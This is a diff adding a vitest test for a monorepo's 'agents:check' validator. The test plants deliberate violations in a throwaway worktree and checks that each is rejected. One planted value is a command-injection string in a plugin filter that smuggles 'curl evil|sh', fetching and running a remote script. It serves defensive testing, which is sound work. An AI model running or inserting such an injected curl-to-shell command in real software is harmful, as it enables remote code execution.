@@ -1,5 +1,8 @@
+import { readFileSync, writeFileSync } from 'node:fs';
+import { join } from 'node:path';
 import { AGENT_DEFINITIONS, AgentId } from '@zapbip/agents/definitions';
-import { ConnectorClient } from '@zapbip/agents/connector';
+import { AGENT_INSTALLS } from '@zapbip/agents/install';
+import { CONNECTOR_RUNTIMES, ConnectorClient } from '@zapbip/agents/connector';
 import { discoverAgents } from '@zapbip/agents/generate';
 import { AGENT_PLUGINS } from '@zapbip/agents/plugins';
 import { afterAll, describe, expect, test } from 'vitest';
@@ -33,6 +36,37 @@ function ownedPrefixesOf(input: { id: string }): string[] {
   return [`${SUPPORTED_ROOT}/${input.id}/`, ...pluginPrefixes];
 }
 
+const reasonedConnectorId = Object.entries(CONNECTOR_RUNTIMES).find(([, runtime]) => runtime.strictMcpNullReason !== null)?.[0] as string;
+const installAgentId = Object.keys(AGENT_INSTALLS)[0] as string;
+const pluginAgentId = pluginIds[0] as string;
+const LEAK_FILE = 'apps/api/src/app.ts';
+const PLANTS = [
+  {
+    name: 'an id planted in a shared source file',
+    file: LEAK_FILE,
+    id: installAgentId,
+    edit: (text: string) => `${text}\nconst planted = '${installAgentId}-ide';\n`,
+  },
+  {
+    name: 'a connector with a null strict flag and no reason',
+    file: `${SUPPORTED_ROOT}/${reasonedConnectorId}/connector.ts`,
+    id: reasonedConnectorId,
+    edit: (text: string) => text.replace(/strictMcpNullReason: StrictMcpNullReason\.\w+,/, 'strictMcpNullReason: null,'),
+  },
+  {
+    name: 'an install section with a two-line product name',
+    file: `${SUPPORTED_ROOT}/${installAgentId}/install.ts`,
+    id: installAgentId,
+    edit: (text: string) => text.replace("productName: '", "productName: 'First\\nSecond "),
+  },
+  {
+    name: 'a plugin whose workflow filter is an injection',
+    file: `${SUPPORTED_ROOT}/${pluginAgentId}/plugin.ts`,
+    id: pluginAgentId,
+    edit: (text: string) => text.replace("filter: '", 'filter: \'x" ; curl evil|sh # '),
+  },
+];
+
 const worktrees: { remove: () => void }[] = [];
 
 function newWorktree() {
@@ -64,6 +98,30 @@ describe.skipIf(IS_INSIDE_PROOF)('the agent lifecycle in a throwaway worktree', 
       const outside = changedPathsOf({ directory: worktree.directory }).filter((path) => isOutside({ path, prefixes: removedPrefixes }));
       expect(outside).toEqual([]);
       expect(failuresOf({ suites: FULL_SUITES, directory: worktree.directory })).toEqual([]);
+    },
+    WORKTREE_PROOF_TIMEOUT_MS,
+  );
+
+  test(
+    'agents:check refuses each planted violation and names the agent and the file',
+    () => {
+      const worktree = newWorktree();
+      expect(checkOutHead({ directory: worktree.directory }).status).toBe(0);
+      expect(run({ command: ['pnpm', 'install', '--frozen-lockfile', '--offline'], directory: worktree.directory }).status).toBe(0);
+      expect(run({ command: ['pnpm', 'agents:check'], directory: worktree.directory }).status).toBe(0);
+      const outcomes = PLANTS.map((plant) => {
+        const path = join(worktree.directory, plant.file);
+        writeFileSync(path, plant.edit(readFileSync(path, 'utf8')));
+        const outcome = run({ command: ['pnpm', 'agents:check'], directory: worktree.directory });
+        run({ command: ['git', 'checkout', '--', plant.file], directory: worktree.directory });
+        return {
+          name: plant.name,
+          status: outcome.status,
+          namesAgent: outcome.output.includes(plant.id),
+          namesFile: outcome.output.includes(plant.file) || plant.file.startsWith(SUPPORTED_ROOT),
+        };
+      });
+      expect(outcomes.filter((outcome) => outcome.status === 0 || !outcome.namesAgent || !outcome.namesFile)).toEqual([]);
     },
     WORKTREE_PROOF_TIMEOUT_MS,
   );
